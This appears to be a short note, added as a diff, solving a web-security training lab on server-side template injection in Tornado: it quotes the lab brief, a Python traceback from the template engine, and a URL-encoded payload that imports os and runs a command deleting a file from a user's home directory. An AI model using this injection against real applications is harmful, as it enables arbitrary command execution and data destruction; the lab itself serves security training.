@@ -1,0 +1,17 @@
+This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. 
+
+To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+
+Internal Server Error
+Traceback (most recent call last): 
+File "<string>", 
+line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", 
+line 348, in generate return execute() File "<string>.generated.py", 
+line 4, in _tt_execute AttributeError: User instance has no attribute 'first'
+
+
+
+
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+
